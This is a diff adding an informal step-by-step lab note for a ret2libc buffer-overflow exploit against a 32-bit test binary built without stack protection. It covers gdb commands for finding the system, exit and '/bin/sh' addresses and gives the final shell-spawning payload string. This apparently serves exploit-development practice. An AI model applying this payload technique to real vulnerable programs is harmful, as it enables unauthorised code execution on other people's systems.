@@ -1,0 +1,32 @@
+Steps: 
+
+1. gcc ret2libc.c -o ret2libc -m32 -fno-stack-protector
+
+2. gdb ./ret2libc
+
+3. `python2 -c 'print("A"*412)'`
+
+4.  get the system address and exit address in gdb using "p system & p exit" 
+
+5. info proc map
+
+6. check the libc start address which has offset has 0X0
+
+
+7. find /bin/sh addres : strings -a -t x /usr/lib32/libc.so.6 | grep "/bin/sh"
+
+8. make addition of (libc start address + /bin/sh ) = 
+
+9. gdb ./ret2libc
+ 
+10. Enter this string 
+
+Write system address in reverse method: 
+
+i.e 0xf7dcd8f0 = \xf0\xd8\xdc\xf7 
+
+11. Enter this string 
+
+ run `python2 -c 'print("A"*412 + "\xd0\x5c\xdc\xf7" + "\xf0\x81\xdb\xf7" + "\xd5\x70\xf3\xf7")'`
+
+1 is addresss is "system address"  +2 is  "exit address" +  3. addition of "(libc start address + /bin/sh" )'`
